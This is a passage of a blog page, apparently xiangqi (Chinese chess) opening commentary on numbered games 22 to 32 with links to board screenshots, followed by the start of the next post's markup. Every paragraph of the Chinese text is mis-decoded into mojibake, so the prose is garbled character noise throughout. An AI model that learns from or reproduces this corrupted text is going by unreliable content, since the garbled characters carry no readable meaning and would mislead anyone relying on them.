<p>æ¥ä¸‹æ¥é»‘æ–¹å®Œå…¨å¯ä»¥æ‰¾å›å¤±å­ï¼Œå¹¶ä¸”ä¸¤ä¸ªç‚®éƒ½å·²ç»å¡åˆ°äº†çº¢æ–¹è£¤è£†é‡Œ</p>
<h4 id="ç¬¬22å±€-å¼ å† ææˆ´"><a href="#ç¬¬22å±€-å¼ å† ææˆ´" class="headerlink" title="ç¬¬22å±€ å¼ å† ææˆ´"></a>ç¬¬22å±€ å¼ å† ææˆ´</h4><p>æ‰¯æ·¡ç‹</p>
<p>åœ¨äº”å…­ç‚®å·¦è¾¹é©¬å¯¹å±é£é©¬å±€é¢ä¸‹ï¼Œå‚»é€¼é»‘æ–¹è¿˜æ˜¯è¦è·³å¤–é©¬å°è½¦ï¼Œä½†æ˜¯çº¢ç‚®å…­è¿›ä¸‰æ‰“é©¬ï¼Œç«‹åˆ»å°±ç»™èµ¶èµ°äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402223738878.png" alt="image-20250402223738878"></p>
<p>å¦‚æ­¤çº¢æ–¹ä¸¤ä¸ªè½¦éƒ½å¯ä»¥é¡ºåˆ©å‡ºç›´è½¦ï¼Œå¿«çš„ä¸€æ‰¹ã€‚è¿™ä¸¤ä¸ªè½¦çš„å¨æ…‘åŠ›å¤ªå¤§äº†ï¼Œè¿½äº¡é€åŒ—ã€‚è€Œé»‘è½¦å‡ºåŠ¨è¿‡äºç¼“æ…¢ï¼Œéš¾ä»¥æŠ—è¡¡ã€‚æ¥ä¸‹æ¥çº¢æ–¹åªéœ€è¦ä¸¤è½¦ç‹ ç‹ å‰å‹ï¼Œè‡³äºé»‘æ–¹éœ€è¦è€ƒè™‘çš„ä¸œè¥¿å°±å¤šäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402223910299.png" alt="image-20250402223910299"></p>
<p>æ¥ä¸‹æ¥é»‘æ–¹è½¦1è¿›3å®ˆæŠ¤å³ä¾§å’æ—æ˜¯å…³é”®ä¸€æ‹›ã€‚å¦‚æœæ²¡èµ°å‡ºæ¥ï¼Œè®©çº¢å·¦è½¦å¼€åˆ°è¿™ä¸ªä½ç½®ï¼Œé»‘æ–¹æ›´åŠ è¢«åŠ¨ï¼Œä¸­è·¯æœ‰è¢«å¼ºè¡Œçªç ´çš„é£é™©ã€‚ä½†æ˜¯é»‘æ–¹å®ˆæŠ¤äº†å³ä¾§ï¼Œå·¦ä¾§å°±æ…¢ä¸€æ­¥ï¼Œä¼šé­åˆ°çº¢å³è½¦å°å‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402224952250.png" alt="image-20250402224952250"></p>
<p>æ­¤æ—¶é»‘1è·¯é©¬å·²ç»æ˜¯ç“®ä¸­ç‹å…«ï¼Œçº¯åç‰¢ç­‰æ­»</p>
<p>çº¢ä¸æ…Œä¸å¿™é€€é©¬ï¼Œç„¶åå¥—ç‚®ï¼Œç„¶åå†è·³æ­£é©¬ï¼Œå°±æŠŠé»‘1è·¯é©¬æŒ¤æ­»äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250402225138177.png" alt="image-20250402225138177"></p>
<p>æ€»ä¹‹é»‘æ–¹å·²ç»æ²¡æ•‘äº†ï¼Œå½“é»‘æ–¹ç”¨å¯¹ä»˜äº”ä¸ƒç‚®çš„ä¸Šå¤–é©¬å°è½¦æ–¹æ³•ï¼Œå¯¹ä»˜äº”å…­ç‚®å¼€å§‹ï¼Œé»‘æ–¹å°±æ— äº†</p>
<h4 id="ç¬¬23å±€-å…ˆå‘åˆ¶äºº"><a href="#ç¬¬23å±€-å…ˆå‘åˆ¶äºº" class="headerlink" title="ç¬¬23å±€ å…ˆå‘åˆ¶äºº"></a>ç¬¬23å±€ å…ˆå‘åˆ¶äºº</h4><p>å…ˆæ‰‹ç‹</p>
<p>åœ¨ä¸­ç‚®å¯¹å±é£é©¬ - çº¢è¿›ä¸‰å…µ å±€é¢ä¸‹ï¼Œ</p>
<p>æ­¤æ—¶é»‘æ–¹æ­£ç€æ˜¯å¯¹æŒº3å’ï¼Œä¿è¯æœ‰ä¸€æ‰¹é©¬æ´»</p>
<p>ç„¶è€Œé»‘æ–¹è¯¯èµ°å³ç‚®åˆ†è¾¹ï¼Œå…¶ç›®çš„æ˜¯æŠ¢å‡ºå³è½¦ï¼Œå…ˆæ‰‹æ‰çº¢ç‚®ï¼ŒåŠ å¿«å¤§å­å‡ºåŠ¨</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403005623900.png" alt="image-20250403005623900"></p>
<p>æ­¤æ—¶çº¢æ–¹å¿…é¡»ç«‹åˆ»ç‚®å…«è¿›äº”ï¼Œå¦åˆ™è®©é»‘æ–¹é¡ºåˆ©å¼€å‡ºç›´è½¦ï¼Œçº¢æ–¹ä¸å¥½æ§åˆ¶å±€é¢ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403005857202.png" alt="image-20250403005857202"></p>
<p>æ­¤æ—¶çº¢å…«è·¯ç‚®å’Œé»‘3è·¯é©¬ä¸¤å±‚éš”æ–­ï¼Œæ˜¯çš„é»‘7è·¯é©¬è„±æ ¹ï¼Œå®¹æ˜“æˆä¸ºçº¢äºŒè·¯è½¦çš„æ”»å‡»å¯¹è±¡</p>
<p>æ¥ä¸‹æ¥å¦‚æœé»‘æ–¹ä¾æ—§æŠ¢å‡ºç›´è½¦ï¼Œé‚£ä¹ˆçº¢ç›´æ¥ç‚®æ¢é©¬ï¼Œæ¥ä¸‹æ¥å³é©¬ç›˜æ²³å¼ºæ”»ä¸­è·¯ï¼Œå·¦é©¬è¢«å‹æ— æ‰€è°“ï¼Œçº¢å³è½¦ä¹Ÿæ‹‰ç€é»‘æ— æ ¹è½¦ç‚®</p>
<p>å¦‚æœé»‘æ–¹æ€‚äº†é£è±¡éš”æ–­ï¼Œé‚£ä¹ˆé»‘7é©¬å°±æ˜¯æ²¡äººç®¡çš„å­¤å„¿ï¼Œçº¢å³è½¦éšæ—¶è¿‡å»å‹é©¬ã€‚åˆ«æ…Œï¼Œå…ˆè·³èµ·å·¦é©¬ï¼Œå‡ºå·¦ç›´è½¦çœ‹ä½å·¦ç‚®ï¼Œå¹¶ä¸”ä¿æŒå·¦ç‚®å°è½¦ï¼Œè¿™æ ·é»‘æŠ¢å‡ºå³ç›´è½¦çš„è®¡åˆ’å°±å¤±è´¥äº†ã€‚</p>
<h4 id="ç¬¬24å±€-è¾¹é©¬äº¡"><a href="#ç¬¬24å±€-è¾¹é©¬äº¡" class="headerlink" title="ç¬¬24å±€ è¾¹é©¬äº¡"></a>ç¬¬24å±€ è¾¹é©¬äº¡</h4><p>è¾¹é©¬ç‹</p>
<p>åœ¨äº”ä¸ƒç‚®å¯¹å±é£é©¬è¿›3å’å³é©¬å¤–ç›˜æ²³ å±€é¢ä¸‹ï¼Œé»‘æ–¹æ­£ç€æ˜¯ç‚®8å¹³9å…‘è½¦ï¼Œç„¶è€Œé»‘æ–¹çœ‹çº¢æ¨ªè½¦å·²ç»èµ°äº†ï¼Œäºæ˜¯é©¬2è¿›1è¸©è¾¹å’çš„ä¸€ä¸ªå®æƒ ï¼ŒåŒæ—¶è¹¬ç‚®</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403011952252.png" alt="image-20250403011952252"></p>
<p>ä½†è¿™å¯¼è‡´äº†é»‘æ–¹2è·¯çš„é©¬åç‚®å°è½¦ç»“æ„ç ´åï¼Œçº¢æ–¹æ¨ªè½¦å®Œå…¨å¯ä»¥å›é©¬æªæ€å›æ¥æ‰é»‘ç‚®ï¼Œ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403012405932.png" alt="image-20250403012405932"></p>
<p>å¦‚æœé»‘æ–¹é€‰æ‹©æ¢ç‚®ï¼Œé‚£ä¹ˆé»‘æ–¹ä¸¤åŒ¹é©¬éƒ½è„±æ ¹ï¼Œç»“æ„å¾ˆå·®</p>
<p>å¦‚æœé»‘æ–¹é€ƒç‚®ï¼Œé‚£ä¹ˆçº¢è½¦å…«è¿›äºŒï¼Œè¿™é©¬ç›´æ¥å°±åŠæ­»ä¸æ´»äº†ã€‚</p>
<p>é»‘æ–¹å¦‚æœç«‹åˆ»æŠŠè¾¹å’æ‹±è¿‡æ¥ï¼Œå€’æ˜¯å¯ä»¥æ‰¾å›å¤±å­ï¼Œä½†æ˜¯ä¼šå¤±æ‰æ›´å¤šå…ˆæ‰‹</p>
<p>å¾—å­å’Œå…µä¸‰è¿›ä¸€ï¼Œçº¢æ–¹æ˜¯å¿…å¾—å…¶ä¸€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403012606280.png" alt="image-20250403012606280"></p>
<h4 id="ç¬¬25å±€-å¢¨å®ˆæˆè§„-âœ¨"><a href="#ç¬¬25å±€-å¢¨å®ˆæˆè§„-âœ¨" class="headerlink" title="ç¬¬25å±€ å¢¨å®ˆæˆè§„ âœ¨"></a>ç¬¬25å±€ å¢¨å®ˆæˆè§„ âœ¨</h4><p>æ¦†æœ¨ç‹</p>
<p>çº¢æ–¹æ²¡æœ‰è·³åŒæ­£é©¬ï¼Œè€Œæ˜¯å·¦é©¬å±¯è¾¹ï¼Œæ­¤æ—¶é»‘æ–¹è¿˜æ˜¯èƒŒDNAæ£‹è°±å¹³ç‚®å…‘è½¦ï¼Œç„¶åé€€ç‚®æ‰“è½¦ã€‚</p>
<p>ä½†æ˜¯è¿™æ—¶å€™çº¢å·¦é©¬å±¯è¾¹å°±æœ‰èµ°äº”ä¸ƒç‚®çš„æœºä¼šï¼Œå¦‚æœé»‘æ–¹è¿˜è¦é€€ç‚®æ‰“è½¦ï¼Œé‚£ä¹ˆé»‘7é©¬å°±è„±æ ¹ã€‚</p>
<p>çº¢ä¸ƒè·¯ç‚®å…µå°†ä¼šå¯¹é»‘3é©¬é€ æˆå¨èƒï¼Œçº¢å‡ºå·¦è½¦å‹é»‘3é©¬ä¹Ÿå¯ä»¥é€ æˆå¨èƒã€‚å®é™…ä¸Šè¿™é‡Œå‡ºå·¦è½¦å‹é©¬æ›´å¥½ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250403014308028.png" alt="image-20250403014308028"></p>
<h4 id="ç¬¬26å±€-å…‘å­å–åŠ¿"><a href="#ç¬¬26å±€-å…‘å­å–åŠ¿" class="headerlink" title="ç¬¬26å±€ å…‘å­å–åŠ¿"></a>ç¬¬26å±€ å…‘å­å–åŠ¿</h4><p>å…‘ç‹ä¹‹ç‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403200617291.png" alt="image-20250403200617291"></p>
<p>åœ¨æ­¤å±€é¢ä¸‹ï¼Œé»‘å¹³å£«è§’ç‚®ï¼Œæœ‰ä¸¤ä¸ªç›®çš„ï¼Œä¸€ä¸ªæ˜¯ç»™3é©¬ç”Ÿæ ¹ï¼Œä¸€ä¸ªæ”¯æ´æ²³å£é©¬é˜²æ­¢çº¢è½¦é¡¶é©¬</p>
<p>å¦‚æœèƒ½å¤ŸæŠŠè¿™ä¸ªç‚®å…‘æ‰ï¼Œé»‘ä¸¤ä¸¤é©¬è„±è·Ÿï¼Œçº¢ä¸¤è½¦å‡å¯é€é©¬</p>
<p>å› æ­¤çº¢æ–¹ç‚®äº”å¹³å››å…‘ç‚®</p>
<h4 id="ç¬¬27å±€-å…µè´µç¥é€Ÿ"><a href="#ç¬¬27å±€-å…µè´µç¥é€Ÿ" class="headerlink" title="ç¬¬27å±€ å…µè´µç¥é€Ÿ"></a>ç¬¬27å±€ å…µè´µç¥é€Ÿ</h4><p>å†²å…µç‹</p>
<p>ä¸­ç‚®è¿‡æ²³è½¦ä¸ƒè·¯é©¬å¯¹å±é£é©¬ çº¢å·¦æ¨ªè½¦ </p>
<p>åœ¨è¯¥å±€é¢ä¸‹ï¼Œé»‘æ–¹ç‚®2å¹³1å‡†å¤‡å‡ºç›´è½¦</p>
<p>ç„¶è€Œä¸­è·¯ä¸€ç›´ç©ºè™šï¼Œæ¥ä¸‹æ¥çº¢æ–¹ä¸­å…µæŒºè¿›ç„¶åä¸­ç‚®ç›˜å¤´é©¬ï¼Œæ”»åŠ¿å¼ºå¤§ã€‚</p>
<p>å¦‚æœé»‘æ–¹ä»è¦å‡ºç›´è½¦ï¼Œçº¢æ–¹è¿˜å¯ä»¥é€€å…«è·¯ç‚®å é›·å…¬ç‚®ï¼Œå¢å¼ºä¸­è·¯æ”»åŠ¿ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403201720262.png" alt="image-20250403201720262"></p>
<h4 id="ç¬¬28å±€-å…‘ä¸é€¢æ—¶"><a href="#ç¬¬28å±€-å…‘ä¸é€¢æ—¶" class="headerlink" title="ç¬¬28å±€ å…‘ä¸é€¢æ—¶"></a>ç¬¬28å±€ å…‘ä¸é€¢æ—¶</h4><p>å…‘äº¡ä¹‹ç‹</p>
<p>ä¸­ç‚®è¿‡æ²³è½¦ä¸ƒè·¯é©¬å…‘å±é£é©¬ä¸¤å¤´è›‡ çº¢å·¦æ¨ªè½¦</p>
<p>åœ¨æ­¤å±€é¢ä¸‹ï¼Œé»‘æ–¹åˆšé€šè¿‡ç‚®2è¿›1é©±èµ¶äº†çº¢å³è½¦ï¼Œæ„Ÿè§‰çº¢å³è½¦èµ°äº†å¾ˆå¤šæ­¥ï¼Œæƒ³è¦ç»§ç»­æ¬ºè´Ÿçº¢å³è½¦ï¼Œäºæ˜¯å¹³ç‚®å…‘è½¦ã€‚</p>
<p>ç„¶è€Œè¿™æ˜¯ä¸€æ‹›ç–‘é—®æ‰‹ã€‚æ­£ç€åº”è¯¥è¡¥è±¡åŠ åšä¸­è·¯ã€‚</p>
<p>æ­¤æ—¶çº¢æ–¹ç›´æ¥å³è½¦å…‘æ‰é»‘è½¦ï¼Œç„¶åå†æŠŠå·¦è½¦å¹³è¿‡æ¥æŠ“é©¬ï¼Œæ˜¯æœ‰å…ˆæ‰‹çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403202250404.png" alt="image-20250403202250404"></p>
<p>æ¥ä¸‹æ¥çº¢è¿›è½¦æ‰åŒé©¬ï¼Œé»‘è¦ä¹ˆé€€çªå¿ƒé©¬è¦ä¹ˆé€€ç‚®çœ‹ï¼Œç„¶è€Œæ­¤æ—¶é»‘æ–¹ä¸­è·¯éå¸¸ç©ºè™šï¼Œçº¢å¯ä»¥ç«‹åˆ»å†²ä¸­å…µï¼Œä¸­ç‚®ç›˜å¤´é©¬æ”»åŠ¿å¼ºå¤§ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403202603466.png" alt="image-20250403202603466"></p>
<p>é»‘å³è½¦æ ¹æœ¬æ¥ä¸åŠå‡ºï¼Œè€Œçº¢è½¦å¯ä»¥è¿½äº¡é€åŒ—</p>
<h4 id="ç¬¬29å±€-é—»é£è€ŒåŠ¨"><a href="#ç¬¬29å±€-é—»é£è€ŒåŠ¨" class="headerlink" title="ç¬¬29å±€ é—»é£è€ŒåŠ¨"></a>ç¬¬29å±€ é—»é£è€ŒåŠ¨</h4><p>æ€‚åŒ…ç‹</p>
<p>ä¸­ç‚®ä¸ƒè·¯é©¬å¯¹å±é£é©¬ çº¢è¿›ä¸­å…µ</p>
<p>åœ¨æ­¤å±€é¢ä¸‹ï¼Œçº¢æ–¹å³è½¦æ²¡å‡ºå°±æŒºèµ·ä¸­å…µï¼Œæ“ä¹‹è¿‡æ€¥ï¼Œæ²¡æœ‰åç»­</p>
<p>ä¸€èˆ¬ä¸­ç‚®ç›˜å¤´é©¬éœ€è¦æœ‰è¿‡æ²³è½¦é…åˆã€‚</p>
<p>é»‘å¯ä»¥å·¦ç‚®è¿‡æ²³å°è½¦ï¼Œå¦‚æ­¤æ²¡æœ‰è¿‡æ²³è½¦é…åˆï¼Œçº¢æ–¹ä¸­è·¯æ”»åŠ¿å°±æ˜¯çº¸è€è™</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403204959101.png" alt="image-20250403204959101"></p>
<h4 id="ç¬¬30å±€-ä¸åŒå‡¡å“"><a href="#ç¬¬30å±€-ä¸åŒå‡¡å“" class="headerlink" title="ç¬¬30å±€ ä¸åŒå‡¡å“"></a>ç¬¬30å±€ ä¸åŒå‡¡å“</h4><p>è£…é€¼ç‹</p>
<p>ä¸­ç‚®ä¸ƒè·¯é©¬å¯¹å±é£é©¬ å±€é¢ä¸‹ï¼Œ</p>
<p>é»‘æ–¹æ­£æ‰‹æ˜¯å‡ºå·¦ç›´è½¦</p>
<p>ç„¶è€Œé»‘æ–¹å·¦é©¬å†’è¿›ï¼Œå´æ²¡æœ‰æ˜ç¡®çš„æˆ˜ç•¥ç›®æ ‡ï¼Œåè€Œå‰Šå¼±äº†ä¸­è·¯é˜²å¾¡ã€‚ </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403211032163.png" alt="image-20250403211032163"></p>
<p>æ¥ä¸‹æ¥çº¢æ–¹çš„æ‰“å‡»ç›®æ ‡å°±æ˜¯é»‘æ–¹ä¸­è·¯å·¦ç‚®è¿‡æ²³æ‰“ä¸­å…µã€‚</p>
<p>å¦‚æœçº¢æ–¹æ²¡èµ°å‡ºè¿™æ­¥æ£‹æ¥ï¼Œè€Œæ˜¯èµ°äº†å·¡æ²³è½¦æˆ–è€…æŠ¬æ¨ªè½¦ï¼Œå°±é”™å¤±æˆ˜æœºäº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250403211255696.png" alt="image-20250403211255696"></p>
<h4 id="ç¬¬31å±€-å…µå»ºå¥‡åŠŸ"><a href="#ç¬¬31å±€-å…µå»ºå¥‡åŠŸ" class="headerlink" title="ç¬¬31å±€ å…µå»ºå¥‡åŠŸ"></a>ç¬¬31å±€ å…µå»ºå¥‡åŠŸ</h4><p>å†²å…µç‹</p>
<p>åœ¨ä¸­ç‚®å³æ¨ªè½¦å¯¹å±é£é©¬ çº¢å·¡æ²³ç‚®</p>
<p>çº¢æ–¹ç›®çš„æ˜¯é€šè¿‡å·¡æ²³ç‚®å…‘æ¢ä¸‰å…µï¼Œæ´»é€šä¸‰é©¬ã€‚</p>
<p>è¯šå¦‚æ˜¯ï¼Œåˆ™çº¢æ–¹åŒé©¬æ´»è·ƒï¼Œé»‘æ–¹æ²¡æœ‰ä¸­ç‚®ï¼Œçº¢åŒé©¬å°±èƒ½è‚†æ— å¿Œæƒ®è·³å‡ºï¼Œçº¢æ–¹ååˆ†æ»¡æ„ã€‚</p>
<blockquote>
<p>é»‘æ–¹æœ€ä½³åº”æ‰‹æ˜¯ç«‹åˆ»å·¦é©¬ç›˜æ²³ã€‚é»‘æ²³å£é©¬éšæ—¶è¸©æ‰çº¢ä¸‰å…µï¼ŒæŒ«è´¥çº¢æ–¹å…‘å…µè®¡åˆ’ã€‚ä¸”é»‘æ²³å£é©¬ä¹ŸæŠ‘åˆ¶äº†çº¢å·¦é©¬ç›˜æ²³ã€‚ä¸”é»‘æœ‰å¹³7ç‚®çš„æƒåˆ©ï¼Œå¯ä»¥å¯¹çº¢ä¸‰è·¯æ–½å‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404205956174.png" alt="image-20250404205956174"></p>
<p>æ­¤å±€é¢ä¸‹å¦‚æœçº¢è¿˜è¦æŒºä¸‰å…µé‚€å…‘å°±å‡ºé—®é¢˜ã€‚é»‘å¹³7ç‚®æ‰“é©¬æ‰“åº•è±¡ï¼Œçº¢éš¾å—çš„ç‹ </p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404210933436.png" alt="image-20250404210933436"></p>
<p>å› æ­¤çº¢æ–¹ä¸èƒ½å†å…‘ä¸‰å…µäº†ï¼Œæ­£æ‰‹åº”è¯¥è½¦ä¸€å¹³å››ï¼Œå€ŸåŠ©æŠ“é©¬å‡ºè½¦ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404211118771.png" alt="image-20250404211118771"></p>
</blockquote>
<p>é»‘æ–¹æ²¡èµ°å·¦é©¬ç›˜æ²³ï¼Œè€Œæ˜¯å·¦ç‚®å¹³è¾¹äº®è½¦</p>
<blockquote>
<p>æ­¤æ—¶çº¢æ–¹ä¾æ—§ä¸èƒ½æŒºä¸‰å…µé‚€å…‘ï¼Œå› ä¸ºé»‘æ–¹æœ‰ä¸€æ‰‹è½¦8è¿›6ï¼Œå‡†å¤‡å†å¹³7å‹é©¬</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404211813582.png" alt="image-20250404211813582"></p>
<p>å¯¹æ­¤çº¢æ–¹æ²¡æœ‰è‰¯å¥½çš„åº”æ³•ï¼š</p>
<p>â€‹	å¦‚æœç‚®å…«é€€ä¸€æ‰“è½¦ï¼Œåˆ™é»‘è½¦8é€€2ç”¨è½¦æ€å…‘å…µï¼Œè¿˜æ˜¯å¯¹çº¢å³é©¬å’Œå³è±¡æ–½åŠ å‹åŠ›ã€‚</p>
<p>â€‹	å¦‚æœé©¬ä¸‰è¿›å››ï¼Œåˆ™å’7è¿›1ï¼Œé©¬å››è¿›å…­ï¼Œè½¦1å¹³3ï¼Œç‚®å…«å¹³ä¸‰ï¼Œå’3è¿›1ã€‚çº¢æ–¹æ²¡æœ‰ä¾¿å®œï¼Œè¿˜å¸®ç€é»‘å‡ºè½¦ã€‚</p>
<p>â€‹	å¦‚æœå…µä¸‰è¿›ä¸€ï¼Œåˆ™è½¦8å¹³7</p>
</blockquote>
<p>çº¢æ–¹åº”ä»¥å·¦é©¬ç›˜æ²³ï¼Œå…¶ç›®çš„æ˜¯æŠ‘åˆ¶é»‘å·¦é©¬ç›˜æ²³ï¼Œéšæ—¶è¸©é»‘3å’ç„¶åå¥—åç‚®å¨èƒé»‘3å’ã€‚</p>
<p>é»‘æ–¹åº”ä»¥å£«4è¿›5ï¼Œæƒ³å‡ºè´´èº«è½¦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404213010045.png" alt="image-20250404213010045"></p>
<blockquote>
<p>æ­¤æ—¶çº¢æ–¹å¿…é¡»ç«‹åˆ»ç‚®äº”å¹³å…­å°è½¦ã€‚</p>
<p>è²Œä¼¼å¯ä»¥ç­‰é»‘å‡ºè´´èº«è½¦æ—¶å†å¹³ç‚®æ‰“è½¦ã€‚å®é™…ä¸Šä¸ç„¶ã€‚çº¢æ–¹è¿™ç§é”™è¯¯çš„æ„æƒ³ï¼Œå…¶æ ¹æºåœ¨äºæ²³å£é˜µåœ°ä¸Šé©¬æœ‰ç‚®ç”Ÿæ ¹ã€‚é»‘æ–¹å¯ä»¥å…ˆèµ°å’3è¿›1ç ´åçº¢æ²³å£é˜µåœ°ï¼Œä½¿çº¢æ²³å£é©¬è„±æ ¹ï¼Œç„¶åå†å‡ºè´´èº«è½¦ã€‚</p>
<p>å¦‚å›¾å‡è®¾çº¢è®¤ä¸ºå¯ä»¥ç¼“ä¸€æ­¥ï¼Œèµ°äº†ä¸ªè½¦ä¹è¿›ä¸€ï¼Œé»‘æ–¹ä¸ä¼šå‚»äº†å§å”§å‡ºè´´èº«è½¦ï¼Œè€Œæ˜¯å…ˆå’3è¿›1ï¼Œä¹‹åå†å‡ºè´´èº«è½¦ã€‚è¯šå¦‚æ˜¯åˆ™é»‘åå…ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404213333755.png" alt="image-20250404213333755"></p>
</blockquote>
<p>é»‘æ–¹å’1è¿›1ï¼Œå‡†å¤‡å†è½¦1è¿›3å®ˆæŠ¤å’æ—ã€‚æ­¤æ—¶çº¢æ–¹ç»™é»‘æ–¹åŸ‹äº†ä¸€ä¸ªé™·é˜±ï¼Œå…µä¹è¿›ä¸€ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404215158509.png" alt="image-20250404215158509"></p>
<blockquote>
<p>çº¢æ–¹è¿™æ­¥æ£‹çš„ç›®çš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404215816119.png" alt="image-20250404215816119"></p>
<p>çº¢å³è½¦å·²ç»æŠ¬èµ·æ¥äº†ï¼Œéšæ—¶å¯ä»¥æ”¯æ´å·¦ç¿¼ï¼Œå¹¶ä¸”çº¢åœ¨å·¦ç¿¼é›†ç»“äº†ä¸¤ç‚®ä¸€é©¬çš„é‡å…µã€‚</p>
<p>è€Œé»‘æ–¹è¡¥å³å£«æš´æ¼äº†å°†é—¨ï¼Œä¹Ÿé˜»éš”äº†å·¦è½¦å‘å³æ”¯æ´ã€‚</p>
<p>å› æ­¤çº¢æ–¹å¸Œæœ›é»‘æ¥æ”¶å…‘å…µï¼Œç„¶ååŒè½¦åˆå¹¶å†å…‘æ¢æ‰é»‘1è·¯è½¦ï¼Œå¦‚æ­¤é»‘æ–¹å³ç¿¼ç©ºè™šï¼Œé»‘å·¦è½¦æ— æ³•å›æ”¾ï¼Œçº¢æ–¹å¯ä»¥åœ¨é»‘å³ç¿¼å‘åŠ¨æ”»åŠ¿ã€‚</p>
</blockquote>
<p>æ­¤æ—¶çº¢ä¹å…µæœ‰æƒæ— æï¼Œå¦‚æœé»‘æ–¹æ”¾ä»»ä¸ç®¡åˆ™çº¢ä¹å…µæ¸¡æ²³ä¹‹åæ€¥è¿›ï¼Œä¼šå¯¹é»‘æ–¹é€ æˆæ›´å¤§å‹åŠ›</p>
<p>å› æ­¤é»‘æ–¹å¿…é¡»æŠ‘åˆ¶çº¢ä¹å…µè¿‡æ²³ã€‚é»‘æ–¹åªæœ‰ä¸¤ç§æ–¹æ³•ï¼Œè¦ä¹ˆç‚®2å¹³1æ‹‰ä½ï¼Œè¦ä¹ˆæ¥æ”¶å…‘å’ã€‚</p>
<p>æ¥æ”¶å…‘å’æ˜¯æœ€å®¹æ˜“èµ°å‡ºçš„ä¸€æ­¥æ£‹ï¼Œä½†æ˜¯å¹¶ä¸å¥½ï¼Œçº¢éœ¸ç‹è½¦ï¼Œå‡†å¤‡å¼ºå¤ºé»‘å’ï¼Œå¹¶ä¸”è¦æ±‚å…‘è½¦ã€‚çº¢é›†ç»“é‡å…µçš„è®¡åˆ’è¿›ä¸€æ­¥å¾—é€ã€‚</p>
<p>å› æ­¤é»‘åªæœ‰ç‚®2å¹³1ï¼Œçº¢é©¬å…­è¿›ä¸ƒè¸©å…µï¼ŒåŒæ—¶è¹¬ç‚®ï¼Œè¿™æ­¥æ£‹åŠ¿åœ¨å¿…è¡Œã€‚</p>
<p>æ­¤æ—¶<strong>é»‘æ–¹åªæœ‰ç‚®2è¿›3æ‰“å…µæ‰èƒ½å‘¨æ—‹</strong>ã€‚å¦‚æœéšå¿ä¸€æ­¥èµ°ç‚®2è¿›1ï¼Œé‚£ä¹ˆçº¢è½¦ä¸€å¹³ä¸ƒæ”¯æŒä¸ƒå…µè¿‡æ²³ï¼Œé»‘æ–¹éš¾ä»¥æŠµæŠ—</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250404220809643.png" alt="image-20250404220809643"></p>
<p>æ€»ç»“</p>
<p>å½“é»‘æ–¹ä¸ºäº†åº”å¯¹çº¢å·¦é©¬ç›˜æ²³è€Œå£«4è¿›5åï¼Œå°±é˜»æŒ¡äº†é»‘å·¦è½¦å³ç§»çš„é€šé“ã€‚</p>
<p>é‚£ä¹ˆçº¢æ–¹çš„æˆ˜ç•¥ç›®æ ‡å°±æ˜¯åœ¨å·¦ç¿¼ä¹Ÿå°±æ˜¯çº¢å³ç¿¼é›†ä¸­å¼ºå¤§å…µåŠ›ï¼Œåœ¨é»‘å·¦è½¦èƒ½å¤Ÿæ”¯æ´ä¹‹å‰å–å¾—ä¼˜åŠ¿ã€‚</p>
<p>è€Œé»‘æ–¹åº”è¯¥åŠªåŠ›æ‰“ç ´çº¢æ–¹æ²³å£é˜µåœ°çš„å°é”ã€‚ç‚®2å¹³1ç„¶åå‡ºå³ç›´è½¦æ‹‰ä½ã€‚åŒæ—¶å·¦ç›´è½¦å¯ä»¥ä¼ºæœºè¿›6å‹é©¬ï¼Œå¯¹çº¢æ–¹é€ æˆéªšæ‰°ã€‚</p>
<h4 id="ç¬¬32å±€-æ™•ç‚®å¦‚ç¥"><a href="#ç¬¬32å±€-æ™•ç‚®å¦‚ç¥" class="headerlink" title="ç¬¬32å±€ æ™•ç‚®å¦‚ç¥"></a>ç¬¬32å±€ æ™•ç‚®å¦‚ç¥</h4><p>ç‚®ç‹</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
